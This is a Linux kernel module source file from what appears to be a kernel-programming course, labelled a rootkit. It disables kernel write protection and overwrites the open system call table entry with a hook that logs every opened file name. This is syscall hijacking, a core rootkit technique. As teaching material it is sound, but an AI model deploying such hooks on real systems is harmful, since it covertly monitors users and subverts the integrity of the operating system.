#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/uaccess.h>
#include <asm/cacheflush.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <linux/types.h>
#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("caudou_j and rouchy_a");
MODULE_DESCRIPTION("M - Kernel Programming I - Rootkit");

void **syscalls_table;

asmlinkage int (*original_call)(const char *, int, int);

asmlinkage int rootkit_open(const char *file, int flags, int mode)
{
	pr_info("file opened [%s]\n", file);
	return original_call(file, flags, mode);
}

static int __init rootkit_init(void)
{
	write_cr0(read_cr0() & (~0x10000));

	syscalls_table = TABLE;
	original_call = syscalls_table[__NR_open];
	syscalls_table[__NR_open] = rootkit_open;

	write_cr0(read_cr0() | (0x10000));
	return 0;
}

static void __exit rootkit_cleanup(void)
{
	write_cr0(read_cr0() & (~0x10000));

	syscalls_table[__NR_open] = original_call;

	write_cr0(read_cr0() | (0x10000));
}

module_init(rootkit_init);
module_exit(rootkit_cleanup);
